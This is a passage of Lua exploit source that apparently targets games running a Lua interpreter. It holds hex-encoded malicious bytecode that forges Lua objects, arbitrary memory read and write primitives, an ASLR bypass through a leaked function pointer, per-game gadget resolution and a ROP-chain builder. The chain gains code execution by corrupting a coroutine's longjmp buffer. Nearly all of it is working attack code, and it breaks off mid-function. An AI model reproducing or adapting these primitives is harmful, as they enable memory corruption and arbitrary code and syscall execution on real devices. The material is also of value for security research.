    local h = bit32.bxor(self.h, v.h)
    local l = bit32.bxor(self.l, v.l)
    return uint64({h = h, l = l})
end

function uint64:band(v)
    v = uint64(v)
    local h = bit32.band(self.h, v.h)
    local l = bit32.band(self.l, v.l)
    return uint64({h = h, l = l})
end

function uint64:bor(v)
    v = uint64(v)
    local h = bit32.bor(self.h, v.h)
    local l = bit32.bor(self.l, v.l)
    return uint64({h = h, l = l})
end

function uint64:bnot()
    local h = bit32.bnot(self.h)
    local l = bit32.bnot(self.l)
    return uint64({h = h, l = l})
end





--
-- lua class
--
-- provide read and limited write primitives
--

lua_types = {
    LUA_TNIL = 0,
    LUA_TBOOLEAN = 1,
    LUA_TLIGHTUSERDATA = 2,
    LUA_TNUMBER = 3,
    LUA_TSTRING = 4,
    LUA_TTABLE = 5,
    LUA_TFUNCTION = 6,
    LUA_TUSERDATA = 7,
    LUA_TTHREAD = 8
}

fakeobj_lclosure_bc = [[
    1b4c756151000104080408000b0000000000000040626367656e2e6c756100430000005100000000
    01000407000000a400000000000001000000009c808000c10000009e0080011e0080000100000003
    0000000000e494400100000000000000000000004500000050000000020000020700000024000000
    04000000040080001c408000010000001e0000011e00800001000000030000000000004540010000
    0000000000000000004600000049000000020000020300000004008000080000001e008000000000
    00000000000300000048000000480000004900000000000000020000000700000000000000746172
    676574000800000000000000636c6f73757265000700000049000000490000004900000049000000
    4d0000004d0000005000000000000000020000000700000000000000746172676574000800000000
    000000636c6f73757265000700000050000000500000005000000050000000500000005000000051
    000000020000000800000000000000636c6f73757265000000000006000000070000000000000074
    617267657400000000000600000000000000
]]

write_upval_bc = [[
    1b4c756151000104080408000b0000000000000040626367656e2e6c756100550000006000000000
    02000606000000e4000000000080010001000040018000dc4080011e008000000000000100000000
    00000000000000570000005f0000000102000406000000a400000004000000c00000009c40000148
    0000001e00800000000000010000000000000000000000580000005b000000010100020200000008
    0000001e0080000000000000000000020000005a0000005b00000001000000080000000000000063
    6c6f7375726500000000000100000001000000070000000000000074617267657400060000005b00
    00005b0000005b0000005b0000005e0000005f000000020000000800000000000000636c6f737572
    65000000000005000000060000000000000076616c75650000000000050000000100000007000000
    0000000074617267657400060000005f0000005f0000005f0000005f0000005f0000006000000003
    0000000800000000000000636c6f73757265000000000005000000060000000000000076616c7565
    000000000005000000070000000000000074617267657400000000000500000000000000
]]



lua = {}

function lua.setup_primitives()
    
    -- evil bytecodes
    lua.fakeobj_closure = load_bytecode(fakeobj_lclosure_bc)
    lua.write_upval = load_bytecode(write_upval_bc)

    lua.setup_initial_read_primitive()  -- one small step
    lua.resolve_address()  -- break aslr and resolve offsets
    lua.setup_victim_table()  -- setup better addrof primitive  
end

-- allocate a limited length string with a known address
function lua.create_str_hacky(data)

    assert(#data <= 39)
    
    local prev_t1, prev_t2 = {}, {}
    local str, addr = nil, nil

    for i=1,16 do
        collectgarbage()
        local t = {}
        local l, s = nil, nil

        if i % 2 == 0 then
            for j=1,5 do t[j] = {} end
            s = data .. string.rep("\0", (39 - #data))
        else
            s = data .. string.rep("\0", (39 - #data))
            for j=1,5 do t[j] = {} end
        end

        prev_t1[i] = lua.addrof_trivial(t[1])
        prev_t2[i] = lua.addrof_trivial(t[2])
        
        if i >= 3 then
            if prev_t1[i-1] == prev_t1[i-2] then
                str, addr = s, prev_t1[i-1]
                break
            elseif prev_t2[i-1] == prev_t2[i-2] then
                str, addr = s, prev_t2[i-1]
                break
            end
        end
    end

    if not (str and addr) then
        error("failed to leak string addr")
    end

    return str, addr
end

function lua.create_str(str)
    local addr = lua.addrof(str)
    if not addr then
        str, addr = lua.create_str_hacky(str)
    end
    return str, addr+24
end

function lua.fakeobj(fake_obj_addr, ttype)
    local addr, fake_tvalues, fake_proto, fake_closure
    fake_tvalues, addr = lua.create_str(ub8(fake_obj_addr) .. ub8(ttype))  -- value + ttype
    fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
    return lua.fakeobj_closure(fake_closure)
end

function lua.setup_initial_read_primitive()
    
    local fake_str_size = 0x100000001337

    -- next + tt/marked/extra/padding/hash + len
    lua.fake_str, lua.fake_str_addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(fake_str_size))
    lua.fake_str = lua.fakeobj(lua.fake_str_addr, lua_types.LUA_TSTRING)

    if bit32.band(#lua.fake_str, 0xffff) ~= 0x1337 then
        error("failed to create fake string obj")
    end
end

function lua.setup_better_read_primitive()

    -- setup fake string at first eboot segment we can read
    local new_fake_str_addr = eboot_addrofs.fake_string

    -- if current fake str is already behind eboot segment, then do nothing
    if new_fake_str_addr > lua.fake_str_addr then return end

    lua.fake_str = lua.fakeobj(new_fake_str_addr, lua_types.LUA_TSTRING)
    lua.fake_str_addr = new_fake_str_addr
end

function lua.resolve_game(luaB_auxwrap)
    print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))
    local nibbles = luaB_auxwrap:band(uint64(0xfff)):tonumber()
    print("[+] luaB_auxwrap nibbles: " .. hex(nibbles))
    
    game_name = games_identification[nibbles]

    if not game_name then
        errorf("unsupported game (luaB_auxwrap nibbles: %s)", hex(nibbles))
    end
    
    if game_name == "RaspberryCube" then
        print("[+] Game identified as Raspberry Cube")
        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
        gadgets = gadget_table.raspberry_cube.gadgets
    elseif game_name == "Aibeya" then
        print("[+] Game identified as Aibeya/B/G")
        eboot_addrofs = gadget_table.aibeya.eboot_addrofs
        libc_addrofs = gadget_table.aibeya.libc_addrofs
        gadgets = gadget_table.aibeya.gadgets
    elseif game_name == "HamidashiCreative" then
        print("[+] Game identified as Hamidashi Creative")
        eboot_addrofs = gadget_table.hamidashi_creative.eboot_addrofs
        libc_addrofs = gadget_table.hamidashi_creative.libc_addrofs
        gadgets = gadget_table.hamidashi_creative.gadgets
    elseif game_name == "AikagiKimiIsshoniPack" then
        print("[+] Game identified as Aikagi Kimi to Issho ni Pack")
        eboot_addrofs = gadget_table.aikagi_kimi_isshoni_pack.eboot_addrofs
        libc_addrofs = gadget_table.aikagi_kimi_isshoni_pack.libc_addrofs
        gadgets = gadget_table.aikagi_kimi_isshoni_pack.gadgets
    elseif game_name == "C" then -- TODO: Test
        print("[+] Game identified as C/D")
        eboot_addrofs = gadget_table.c.eboot_addrofs
        libc_addrofs = gadget_table.c.libc_addrofs
        gadgets = gadget_table.c.gadgets
    elseif game_name == "E" then -- TODO: Test
        print("[+] Game identified as E")
        eboot_addrofs = gadget_table.e.eboot_addrofs
        libc_addrofs = gadget_table.e.libc_addrofs
        gadgets = gadget_table.e.gadgets
    elseif game_name == "F" then -- TODO: Test
        print("[+] Game identified as F")
        eboot_addrofs = gadget_table.f.eboot_addrofs
        libc_addrofs = gadget_table.f.libc_addrofs
        gadgets = gadget_table.f.gadgets
    end
end

function lua.resolve_address()

    local luaB_auxwrap = nil
    local consume = {}
    
    for i=1,64 do

        local co = coroutine.wrap(function() end)
        consume[i] = co

        -- read f field of CClosure (luaB_auxwrap)
        local addr = memory.read_qword(lua.addrof(co)+0x20)
        if addr then
            -- calculate eboot base from luaB_auxwrap offset
            luaB_auxwrap = addr
            break
        end
    end
    
    if not luaB_auxwrap then
        error("failed to leak luaB_auxwrap")
    end
    
    lua.resolve_game(luaB_auxwrap)
    
    eboot_base = luaB_auxwrap - eboot_addrofs.luaB_auxwrap
    print("[+] eboot base @ " .. hex(eboot_base))

    -- resolve offsets to their address
    for k,v in pairs(gadgets) do
        if k == "stack_pivot" then
            local list = {}
            for name, offset in pairs(v) do
                local info = {}
                info.gadget_addr = eboot_base + offset
                info.pivot_addr = uint64(name:match("(0x%x+)"))
                info.pivot_base = info.pivot_addr:band(uint64(0xfff):bnot())
                table.insert(list, info)
            end
            gadgets[k] = list
        else
            gadgets[k] = eboot_base + v
        end
    end

    for k,offset in pairs(eboot_addrofs) do 
        eboot_addrofs[k] = eboot_base + offset 
    end

    -- setup fake string that can read more memory space
    lua.setup_better_read_primitive()

    -- resolve libc
    libc_base = memory.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
    print("[+] libc base @ " .. hex(libc_base))
    
    for k,offset in pairs(libc_addrofs) do 
        libc_addrofs[k] = libc_base + offset 
    end
end

-- setup a table where we can read its array buffer
function lua.setup_victim_table()
    assert(lua.fake_str)
    local t = { 1, 2 }
    local array_addr = memory.read_qword(lua.addrof(t)+24)
    if array_addr then
        if lua.read_buffer(array_addr, 1) then  -- test if we can read the buffer
            lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
        end
    end
    if not (lua.tbl_victim and lua.tbl_victim_array_addr) then
        error("failed to find victim table")
    end
end

function lua.get_obj_value(obj)
    if not lua.tbl_victim then return nil end
    lua.tbl_victim[1] = obj
    return memory.read_qword(lua.tbl_victim_array_addr)
end

function lua.addrof_trivial(x)
    local addr = tostring(x):match("^%a+:? 0?x?%(?(%x+)%)?$")
    return addr and uint64("0x" .. addr) or nil
end

function lua.addrof(obj)
    return lua.get_obj_value(obj) or lua.addrof_trivial(obj)
end

function lua.read_buffer(addr, size)
    if not lua.fake_str then return nil end
    size = uint64(size):tonumber()
    -- check if addr to read is after fake string addr
    local rel_addr = (uint64(addr) - (lua.fake_str_addr + 23)):tonumber()
    return rel_addr >= 0 and lua.fake_str:sub(rel_addr, rel_addr + size - 1) or nil 
end

function lua.read_qword(addr)
    local value = lua.read_buffer(addr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function lua.read_multiple_qwords(addr, count)
    local qwords = {}
    local buffer = lua.read_buffer(addr, count*8)
    for i=0,(#buffer/8)-1 do
        table.insert(qwords, uint64.unpack(buffer:sub(i*8+1, i*8+8)))
    end
    return qwords
end

-- write 8 bytes (double) at target address with 4 bytes corruption after addr+8
function lua.write_double(addr, value)
    local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval)+24)  -- env + proto + upvals
    lua.write_upval(fake_closure, value)
end

-- write 8 bytes (qword) at target address with 5 bytes corruption after addr+8
function lua.write_qword(addr, value)
    local setbit = uint64(1):lshift(56)
    value = uint64(value)
    lua.write_double(addr, string_to_double(ub8(value + setbit)))
    lua.write_double(addr+1, string_to_double(ub8(value:rshift(8) + setbit)))
end

function lua.write_multiple_qwords(addr, list)
    for i,v in ipairs(list) do
        lua.write_qword(addr+8*(i-1), list[i])
    end
end

-- copy memory from src to dest with 5 bytes corruption after dest+size
function lua.memcpy(dest, src, size)
    size = uint64(size):tonumber()
    if size % 8 ~= 0 then
        errorf("lua.memcpy() needs size to be aligned by 8 bytes (given %s)", hex(size))
    end
    lua.write_multiple_qwords(dest, memory.read_multiple_qwords(src, size / 8))
end

function lua.create_fake_cclosure(addr)
    -- next + tt/marked/isC/nupvalues/hole + gclist + env + f
    local fake_cclosure = ub8(0) .. "\6\0\1\0\0\0\0\0" .. ub8(0) .. ub8(0) .. ub8(addr)
    return lua.fakeobj(lua.addrof(fake_cclosure)+24, lua_types.LUA_TFUNCTION)
end




--
-- bump allocator class
--
-- provide initial memory allocation which is backed by lua string
--

bump = {}

bump.pool_size = 5 * 1024 * 1024  -- 5mb

function bump.init()
    local padding = align_16(24) -- offset to data
    bump.lua_backing = string.rep("\0", bump.pool_size + padding)
    bump.pool_base = lua.addrof(bump.lua_backing) + padding
    bump.pool_current = bump.pool_base
end

function bump.alloc(size)

    assert(type(size) == "number")

    -- init for first time
    if not bump.pool_base then
        bump.init()
    end

    if bump.pool_current + size >= bump.pool_base + bump.pool_size then
        error("bump allocator exhausted")
    end

    local addr = bump.pool_current
    bump.pool_current = bump.pool_current + size
    return addr
end





--
-- memory class
--
-- provide arbitrary r/w & allocation primitives
--

memory = {}

-- memory.alloc() always return zeroed buffer 
function memory.alloc(size)
    -- compensate for write corruption by lua primitive
    size = align_16(size + 8)
    if native_invoke then
        return native.fcall(libc_addrofs.calloc, size, 1)
    else
        return bump.alloc(size)
    end
end

function memory.read_buffer(addr, size)
    assert(addr and size)
    if native_invoke then
        return native.read_buffer(addr, size)
    else
        return lua.read_buffer(addr, size)
    end
end

function memory.read_dword(addr)
    local value = memory.read_buffer(addr, 4)
    return value and #value == 4 and uint64.unpack(value) or nil 
end

function memory.read_qword(addr)
    local value = memory.read_buffer(addr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function memory.read_multiple_qwords(addr, count)
    local qwords = {}
    local buffer = memory.read_buffer(addr, count*8)
    for i=0,(#buffer/8)-1 do
        table.insert(qwords, uint64.unpack(buffer:sub(i*8+1, i*8+8)))
    end
    return qwords
end

function memory.write_buffer(dest, buffer)
    assert(dest and buffer)
    if native_invoke then
        native.write_buffer(dest, buffer)
    elseif memory.memcpy then
        memory.memcpy(dest, lua.addrof(buffer)+24, #buffer)
    else
        error("no write primitive available")
    end
end

function memory.write_byte(dest, value)
    memory.write_buffer(dest, ub8(value):sub(1,1))
end

function memory.write_word(dest, value)
    memory.write_buffer(dest, ub8(value):sub(1,2))
end

function memory.write_dword(dest, value)
    memory.write_buffer(dest, ub8(value):sub(1,4))
end

function memory.write_qword(dest, value)
    memory.write_buffer(dest, ub8(value))
end

function memory.hex_dump(addr, size)
    return hex_dump(memory.read_buffer(addr, size), addr)
end

function memory.read_null_terminated_string(addr)
    local result = ""
    while true do
        local chunk = memory.read_buffer(addr, 0x50)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        addr = addr + #chunk
    end
    return result
end





--
-- ropchain class
--
-- helper for creating rop chains
--

ropchain = {}
ropchain.__index = ropchain

setmetatable(ropchain, {
    __call = function(_, opt)  -- make class callable as constructor
        return ropchain:new(opt)
    end
})

function ropchain:new(opt)

    opt = opt or {}

    local self = setmetatable({}, ropchain)

    if not ropchain.fcall_stub then
        ropchain.create_fcall_stub(0x20000)
    end

    self.stack_size = opt.stack_size or 0x2000
    self.stack_base = opt.stack_base or memory.alloc(self.stack_size)
    self.align_offset = 0
    self.stack_offset = 0
    
    -- assume that first stack slot is consumed by longjmp
    if not opt.start_from_base then
        self.stack_offset = 8
    end

    -- align stack base to 16 bytes
    if self.stack_base:tonumber() % 16 ~= 0 then
        local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
        self.push_set_rsp(self, jmp_to)
        self.align_offset = jmp_to - self.stack_base
        self.stack_offset = 0
    end

    self.retval_addr = {}

    -- recover from call [rax+8] instruction
    self.recover_from_call = memory.alloc(0x10)
    lua.write_qword(self.recover_from_call+8, gadgets["pop rbx; ret"])

    return self
end

function ropchain.create_fcall_stub(padding_size)
    
    ropchain.fcall_stub = {}
    ropchain.fcall_stub.fn_addr = memory.alloc(padding_size) + (padding_size - 0x100)
    
    local stub = ropchain({
        stack_base = ropchain.fcall_stub.fn_addr,
        start_from_base = true
    })

    stub:push(0) -- fn addr

    stub:push_store_rax_into_memory(0)
    ropchain.fcall_stub.retval_addr = stub:get_rsp() - 0x10

    stub:push_set_rsp(0)
    ropchain.fcall_stub.return_addr = stub:get_rsp() - 0x8

    ropchain.fcall_stub.chain = stub
end

function ropchain:__tostring()

    local result = {}

    table.insert(result, string.format("ropchain @ %s (size: %s)\n", 
        hex(self.stack_base), hex(self.stack_offset)))

    table.insert(result, string.format("fcall_stub.fn_addr: %s",
        hex(ropchain.fcall_stub.fn_addr)))

    table.insert(result, string.format("fcall_stub.retval_addr: %s",
        hex(ropchain.fcall_stub.retval_addr)))

    table.insert(result, string.format("fcall_stub.return_addr: %s\n",
        hex(ropchain.fcall_stub.return_addr)))

    local qwords = memory.read_multiple_qwords(self.stack_base + self.align_offset, self.stack_offset / 8)

    local value_symbol = {}
    for i,t in ipairs({gadgets, eboot_addrofs, libc_addrofs}) do
        for k,v in pairs(t) do
            if k ~= "stack_pivot" then
                value_symbol[hex(v)] = k
            end
        end
    end

    local idx = 1
    while idx < #qwords+1 do
        local offset = 8 * (idx-1)
        local val = hex(qwords[idx])
        if value_symbol[val] then
            val = val .. string.format("\t; %s", value_symbol[val])
        end
        table.insert(result, string.format("%s: %s", hex(self.stack_base + offset), val))
        idx = idx + 1
    end

    return "\n" .. table.concat(result, "\n")
end

function ropchain:get_rsp() 
    return self.stack_base + self.align_offset + self.stack_offset
end

-- align stack to 16 bytes
function ropchain:align_stack()
    if self.stack_offset % 16 == 8 then
        self:push_ret()
    end
end

function ropchain:increment_stack()

    if self.stack_offset >= self.stack_size then
        error("ropchain storage exhausted")
    end

    local rsp = self:get_rsp()
    self.stack_offset = self.stack_offset + 8
    return rsp
end

function ropchain.resolve_value(v)
    if type(v) == "string" then
        return lua.addrof(v)+24
    elseif type(v) == "number" then
        return uint64(v)
    elseif is_uint64(v) then
        return v
    end
    errorf("ropchain.resolve_value: invalid type (%s)", type(v))
end

function ropchain:push(v)

    if self.finalized then
        error("ropchain has been finalized and cant be modified")
    end

    if self.enable_mock_push then
        self:increment_stack()
    else
        lua.write_qword(self:increment_stack(), ropchain.resolve_value(v))
    end
end

function ropchain:mock_push(callback)

    local before_prep_offset = self.stack_offset

    self.enable_mock_push = true
    callback()
    self.enable_mock_push = false
    
    local size = self.stack_offset - before_prep_offset
    self.stack_offset = before_prep_offset
    
    return size
end

function ropchain:push_ret()
    self:push(gadgets["ret"])
end

function ropchain:push_set_rsp(v) 
    self:push(gadgets["pop rsp; ret"])
    self:push(v)
end

function ropchain:push_set_rbp(v) 
    self:push(gadgets["pop rbp; ret"])
    self:push(v)
end

function ropchain:push_set_rax(v)
    self:push(gadgets["pop rax; ret"])
    self:push(v)
end

function ropchain:push_set_rbx(v)
    self:push(gadgets["pop rbx; ret"])
    self:push(v)
end

function ropchain:push_set_rcx(v)
    self:push(gadgets["pop rcx; ret"])
    self:push(v)
end
function ropchain:push_set_rdx(v)
    self:push(gadgets["pop rdx; ret"])
    self:push(v)
end

function ropchain:push_set_rdi(v)
    self:push(gadgets["pop rdi; ret"])
    self:push(v)
end

function ropchain:push_set_rsi(v)
    self:push(gadgets["pop rsi; ret"])
    self:push(v)
end

function ropchain:push_set_r8(v)
    self:push(gadgets["pop r8; ret"])
    self:push(v)
end

-- clobbers rax, rbx
function ropchain:push_set_r9(v)

    local set_r9_gadget = nil
    
    if gadgets["mov r9, rbx; call [rax + 8]"] then
        self:push_set_rax(self.recover_from_call)
        self:push_set_rbx(v)
        set_r9_gadget = gadgets["mov r9, rbx; call [rax + 8]"]
    else
        self:push_set_rax(self.recover_from_call)
        self:push(gadgets["pop r13 ; pop r14 ; pop r15 ; ret"])
        self:push(v)
        set_r9_gadget = gadgets["mov r9, r13; call [rax + 8]"]
    end

    self:push_ret()
    self:push_ret()
    self:push(set_r9_gadget)

    -- fix chain as `call` instruction corrupts it by pushing ret addr
    self:push_write_qword_memory(self:get_rsp() - 0x8, set_r9_gadget)
end

function ropchain:push_set_r9_wo_call(v) -- clobbers rax, rsi, r8
    temp_addr = bump.alloc(0x8)
    memory.write_qword(self.recover_from_call, v)
    self:push_set_rax(self.recover_from_call - 0x18)
    self:push_set_rsi(0)
    self:push_set_r8(temp_addr)
    self:push(gadgets["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"])
end

function ropchain:push_set_rax_from_memory(addr)
    self:push_set_rax(addr)
    self:push(gadgets["mov rax, [rax]; ret"])
end

function ropchain:push_store_eax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], eax; ret"])
end

function ropchain:push_store_rax_data_and_add_into_memory(addr, num)
    self:push(gadgets["mov rax, [rax]; ret"])
    self:push_add_to_rax(num)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_store_rax_data_into_memory(addr)
    self:push(gadgets["mov rax, [rax]; ret"])
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_store_rax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_store_rcx_into_memory(addr) -- clobber rax
    self:push_set_rax(addr - 0x8)
    self:push(gadgets["mov [rax + 8], rcx; ret"])
end

function ropchain:push_store_rdx_into_memory(addr) -- clobber rax
    self:push_set_rax(addr - 0x28)
    self:push(gadgets["mov [rax + 0x28], rdx; ret"])
end

function ropchain:push_store_rdi_into_memory(addr) -- clobber rcx
    self:push_set_rcx(addr - 0xa0)
    self:push(gadgets["mov [rcx + 0xa0], rdi; ret"])
end

function ropchain:push_add_to_rax(num)  -- clobber r8
    self:push_set_r8(num)
    self:push(gadgets["add rax, r8; ret"])
end

function ropchain:push_add_dword_memory_with_eax(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], eax; ret"])
end

function ropchain:push_add_dword_memory_with_ecx(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], ecx; ret"])
end

function ropchain:push_add_dword_memory_with_edi(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], edi; ret"])
end

function ropchain:push_add_dword_memory(addr, num)
    if gadgets["add [rbx], eax; ret"] then
        self:push_set_rax(uint64(num).l)
        self:push_add_dword_memory_with_eax(addr)
    elseif gadgets["add [rbx], ecx; ret"] then
        self:push_set_rcx(uint64(num).l)
        self:push_add_dword_memory_with_ecx(addr)
    else
        self:push_set_rdi(uint64(num).l)
        self:push_add_dword_memory_with_edi(addr)
    end
end

function ropchain:push_write_dword_memory(addr, v)
    self:push_set_rax(v)
    self:push_store_eax_into_memory(addr)
end

function ropchain:push_write_qword_memory(addr, v)  -- clobbers rdi
    self:push_set_rax(v)
    self:push_store_rax_into_memory(addr)
end

function ropchain:push_set_reg_from_reg(target_reg, src_reg)  -- clobbers rdi

    if not (src_reg == "rax" or src_reg == "rdi") then
        error("ropchain:push_set_reg_from_reg() accepts only rax or rdi as source reg")
    end

    local disp = (target_reg == "r9") and 0x30 or 0x20
    self["push_store_" .. src_reg .. "_into_memory"](self, self:get_rsp() + disp)  -- overwrite pop reg value
    self["push_set_" .. target_reg](self, 0)
end

function ropchain:push_set_reg_from_rax(reg)
    self:push_set_reg_from_reg(reg, "rax")
end

function ropchain:push_set_reg_from_rdi(reg)
    self:push_set_reg_from_reg(reg, "rdi")
end

function ropchain:push_set_reg_from_memory(reg, addr)
    self:push_set_rax_from_memory(addr)
    self:push_set_reg_from_rax(reg)
end

function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    if rdi then self:push_set_rdi(rdi) end
    if rsi then self:push_set_rsi(rsi) end
    if rdx then self:push_set_rdx(rdx) end
    if rcx then self:push_set_rcx(rcx) end
    if r8 then self:push_set_r8(r8) end
    if r9 then self:push_set_r9(r9) end
end

function ropchain:push_syscall_raw(syscall, prep_arg_callback)

    assert(syscall.fn_addr and syscall.syscall_no)

    local push_size = 0
    local push_cb = function()
        self:push_write_qword_memory(self:get_rsp() + push_size, syscall.fn_addr)
        if prep_arg_callback then
            prep_arg_callback()
        end
        self:push_set_rax(syscall.syscall_no)
    end

    push_size = self:mock_push(push_cb)
    push_cb()
    
    self:push(0) -- will be overwritten
end

function ropchain:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
    self:push_syscall_raw(syscall, function()
        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    end)
end

function ropchain:push_syscall_with_ret(syscall, rdi, rsi, rdx, rcx, r8, r9)
    self:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
    self:push_store_retval()
end

-- if `is_ptr` is set, rip is assumed to be ptr to the real address
-- this fn will always allocate memory to hold return value
function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)

    local ret_value = memory.alloc(8)
    local fcall_stub = ropchain.fcall_stub

    table.insert(self.retval_addr, ret_value)

    if is_ptr then
        self:push_set_rax_from_memory(rip)
        self:push_store_rax_into_memory(fcall_stub.fn_addr)
    else
        self:push_write_qword_memory(fcall_stub.fn_addr, rip)
    end

    self:push_write_qword_memory(fcall_stub.retval_addr, ret_value)

    local push_size = 0

    local push_cb = function()
        self:push_write_qword_memory(fcall_stub.return_addr, self:get_rsp() + push_size)
        if prep_arg_callback then
            prep_arg_callback()
        end
        self:push_set_rsp(fcall_stub.fn_addr)
    end

    push_size = self:mock_push(push_cb)
    push_cb()
end

function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_fcall_raw(rip, function()
        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    end)
end

function ropchain:push_store_retval()
    local buf = memory.alloc(8)
    table.insert(self.retval_addr, buf)
    self:push_store_rax_into_memory(buf)
end

function ropchain:get_retval()
    local retval = {}
    for i,v in ipairs(self.retval_addr) do
        table.insert(retval, memory.read_qword(v))
    end
    return retval
end

function ropchain:dispatch_jumptable_with_rax_index(jump_table)

    self:push_set_rcx(3)
    self:push(gadgets["shl rax, cl; ret"])

    self:push_add_to_rax(jump_table)
    self:push(gadgets["mov rax, [rax]; ret"])

    self:push_set_reg_from_rax("rsp")
end

-- only unsigned 32-bit comparison is supported
function ropchain:create_branch(value_address, op, compare_address)

    local jump_table = memory.alloc(0x10)

    if gadgets["cmp [rcx], eax; ret"] then
        self:push_set_rcx(value_address)
        self:push_set_rax_from_memory(compare_address)
        self:push(gadgets["cmp [rcx], eax; ret"])
    else
        self:push_set_rbx(compare_address)
        self:push_set_rax_from_memory(compare_address)
        self:push(gadgets["cmp [rax], ebx; ret"])
    end

    self:push_set_rax(0)

    if op == "==" then
        self:push(gadgets["sete al; ret"])
    elseif op == "!=" then
        self:push(gadgets["setne al; ret"])
    elseif op == ">" then
        self:push(gadgets["seta al; ret"])
    elseif op == "<" then
        self:push(gadgets["setb al; ret"])
    else
        errorf("ropchain:create_branch: invalid op (%s)", op)
    end

    self:dispatch_jumptable_with_rax_index(jump_table)

    return jump_table
end

function ropchain:gen_loop(value_address, op, compare_address, callback)

    -- {
    local target_loop = self:get_rsp()
    callback()
    -- } while (memory[value_address] <op> memory[compare_address])
    local jump_table = self:create_branch(value_address, op, compare_address)

    lua.write_multiple_qwords(jump_table, {
        self:get_rsp(), -- comparison false
        target_loop, -- comparison true
    })
end

function ropchain:restore_through_longjmp(jmpbuf)
    
    if self.finalized then
        return
    end

    self.jmpbuf = jmpbuf or memory.alloc(0x100)

    -- restore execution through longjmp
    self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)

    self.finalized = true
end

-- corrupt coroutine's jmpbuf for code execution
function ropchain:execute_through_coroutine()

    local run_hax = function(lua_state_addr)

        -- backup original jmpbuf
        local jmpbuf_addr = memory.read_qword(lua_state_addr+0xa8) + 0x8
        lua.memcpy(self.jmpbuf, jmpbuf_addr, 0x100)

        -- overwrite registers in jmpbuf
        lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
        lua.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp

        assert(false) -- trigger exception
    end

    -- run ropchain
    local victim = coroutine.create(run_hax)
    coroutine.resume(victim, lua.addrof(victim))
    
    -- get return value(s)
    return unpack(self:get_retval())
end





--
-- fcall class
--
-- helper to execute function or system call through rop
--

fcall = {}
fcall.__index = fcall

setmetatable(fcall, {
    __call = function(_, fn_addr, syscall_no)  -- make class callable as constructor
        return fcall:new(fn_addr, syscall_no)
    end
})

function fcall:new(fn_addr, syscall_no)

    assert(fn_addr, "invalid function address")
    
    if not fcall.chain then
        fcall.create_initial_chain()
    end

    local self = setmetatable({}, fcall)
    self.fn_addr = fn_addr
    self.syscall_no = syscall_no
    return self
end

function fcall.create_initial_chain()

    local arg_addr = {
        fn_addr = memory.alloc(8),
        syscall_no = memory.alloc(8),
        rdi = memory.alloc(8),
        rsi = memory.alloc(8),
        rdx = memory.alloc(8),
        rcx = memory.alloc(8),
        r8 = memory.alloc(8),
        r9 = memory.alloc(8),
    }

    local chain = ropchain()

    local prep_arg_callback = function()
        chain:push_set_reg_from_memory("r9", arg_addr.r9)
        chain:push_set_reg_from_memory("r8", arg_addr.r8)
        chain:push_set_reg_from_memory("rcx", arg_addr.rcx)
        chain:push_set_reg_from_memory("rdx", arg_addr.rdx)
        chain:push_set_reg_from_memory("rsi", arg_addr.rsi)
        chain:push_set_reg_from_memory("rdi", arg_addr.rdi)
        chain:push_set_rax_from_memory(arg_addr.syscall_no)
    end
    
    chain:push_fcall_raw(arg_addr.fn_addr, prep_arg_callback, true)
    chain:restore_through_longjmp()

    fcall.arg_addr = arg_addr
    fcall.chain = chain
end

function fcall:__call(rdi, rsi, rdx, rcx, r8, r9)
    if native_invoke then
        return native.fcall_with_rax(self.fn_addr, self.syscall_no, rdi, rsi, rdx, rcx, r8, r9)
    else
        local arg_addr = fcall.arg_addr
        lua.write_qword(arg_addr.fn_addr, self.fn_addr)
        lua.write_qword(arg_addr.syscall_no, self.syscall_no or 0)
        lua.write_qword(arg_addr.rdi, ropchain.resolve_value(rdi or 0))
        lua.write_qword(arg_addr.rsi, ropchain.resolve_value(rsi or 0))
        lua.write_qword(arg_addr.rdx, ropchain.resolve_value(rdx or 0))
        lua.write_qword(arg_addr.rcx, ropchain.resolve_value(rcx or 0))
        lua.write_qword(arg_addr.r8, ropchain.resolve_value(r8 or 0))
        lua.write_qword(arg_addr.r9, ropchain.resolve_value(r9 or 0))
        return select(1, fcall.chain:execute_through_coroutine())
    end
end

function fcall:__tostring()
    return string.format("address @ %s\n%s", hex(self.fn_addr), tostring(fcall.chain))
end




--
-- syscall class
--
-- helper for managing & resolving syscalls
--

syscall = {}

function syscall.init()
    
